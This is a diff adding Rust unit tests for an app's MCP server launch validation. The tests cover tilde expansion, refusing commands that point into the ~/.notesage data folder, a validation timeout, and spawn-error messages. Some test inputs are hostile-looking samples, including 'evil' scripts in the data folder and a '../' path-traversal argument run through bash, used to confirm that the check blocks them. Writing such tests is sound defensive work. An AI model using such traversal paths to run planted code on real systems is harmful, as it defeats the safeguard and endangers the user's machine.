+        assert!(!reject("node", &[".notesage/server.js"], "/Users/someone/project"));
+        assert!(!reject("node", &["server.js"], "/Users/someone/src/server"));
+        assert!(!reject("npx", &["-y", "pkg"], "/Users/someone"));
+        assert!(!reject("uv", &["run", "server.py"], "/Users/someone/src"));
+    }
+
+    #[test]
+    fn expand_tilde_expands_only_a_leading_home_reference() {
+        let home = std::path::Path::new("/Users/someone");
+        let cases = [
+            ("~", "/Users/someone"),
+            ("~/bin/server", "/Users/someone/bin/server"),
+            ("~/My Docs/a b", "/Users/someone/My Docs/a b"),
+            ("/abs/path", "/abs/path"),
+            ("relative/~/path", "relative/~/path"),
+            ("~other/bin", "~other/bin"),
+            ("--dir=~/x", "--dir=~/x"),
+            ("npx", "npx"),
+            ("", ""),
+        ];
+        for (input, expected) in cases {
+            assert_eq!(expand_tilde(input, home), expected, "{input:?}");
+        }
+    }
+
+    #[test]
+    fn expanding_tilde_first_does_not_let_a_path_past_the_data_folder_check() {
+        // The spawn expands `~` and then validates. Expanded or not, a path
+        // into the data folder is refused.
+        let home = std::path::Path::new("/Users/someone");
+        for (command, list) in [
+            ("~/.notesage/evil", vec![]),
+            ("node", vec!["~/.notesage/evil.js"]),
+            ("bash", vec!["~/Documents/../.notesage/evil.sh"]),
+        ] {
+            let raw = args(&list);
+            assert!(validate_not_in_data_dir(command, &raw, home, home).is_err(), "{command} {list:?}");
+            let expanded_command = expand_tilde(command, home);
+            let expanded: Vec<String> = raw.iter().map(|a| expand_tilde(a, home)).collect();
+            assert!(
+                validate_not_in_data_dir(&expanded_command, &expanded, home, home).is_err(),
+                "expanded: {expanded_command} {expanded:?}"
+            );
+        }
+        // And the working directory, given with a `~`.
+        assert!(super::validate_mcp_command("node", &args(&["server.js"]), Some(std::path::Path::new("~/.notesage"))).is_err());
+        assert!(super::validate_mcp_command("node", &args(&["server.js"]), Some(std::path::Path::new("~/src"))).is_ok());
+    }
+
+    #[test]
+    fn validation_budget_covers_a_cold_package_download() {
+        assert_eq!(MCP_VALIDATE_TIMEOUT, Duration::from_secs(120));
     }
 
     #[test]
@@ -530,6 +1086,17 @@ mod tests {
         assert_eq!(kind, "binary_not_found");
         assert!(msg.contains("definitely-not-a-real-cmd"));
         assert!(msg.contains("PATH"));
+    }
+
+    #[test]
+    fn map_spawn_error_explains_a_whole_command_line_in_the_command_field() {
+        let not_found = std::io::Error::new(std::io::ErrorKind::NotFound, "No such file");
+        let (kind, msg) = map_spawn_error(&not_found, "npx -y @modelcontextprotocol/server-memory");
+        assert_eq!(kind, "binary_not_found");
+        assert!(msg.contains("put everything after it in the arguments"), "{msg}");
+        // A program whose path contains a space is not that mistake.
+        let (_, msg) = map_spawn_error(&not_found, "/Applications/My Tool/bin/server");
+        assert!(!msg.contains("arguments"), "{msg}");
     }
 
     #[test]
